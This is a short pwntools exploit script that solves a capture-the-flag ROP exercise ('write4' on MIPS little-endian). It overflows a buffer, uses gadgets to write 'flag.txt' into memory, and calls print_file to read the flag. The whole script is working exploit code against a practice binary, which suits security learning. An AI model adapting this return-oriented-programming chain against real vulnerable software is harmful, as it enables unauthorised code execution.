from pwn import *

BINARY = "./write4_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = process(BINARY)

"""
---------- write_gadget ----------
0x400930   lw      $t9, 0xC($sp)
0x400934   lw      $t0, 8($sp)
0x400938   lw      $t1, 4($sp)
0x40093C   sw      $t1, 0($t0)
0x400940   jalr    $t9
0x400944   addi    $sp, 0x10

---------- pop_t9_a0_call_t9 ----------
0x400948   lw      $a0, 8($sp)
0x40094C   lw      $t9, 4($sp)
0x400950   jalr    $t9
"""

write_gadget      = p32(0x400930)
pop_t9_a0_call_t9 = p32(0x400948)
data_adr          = 0x411000

rop = b"A" * 36

rop += write_gadget
rop += b"BBBB"
rop += b"flag"
rop += p32(data_adr)

rop += write_gadget
rop += b"CCCC"
rop += b".txt"
rop += p32(data_adr+4)

rop += pop_t9_a0_call_t9
rop += b"DDDD"
rop += p32(ELF.symbols['print_file'])
rop += p32(data_adr)

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
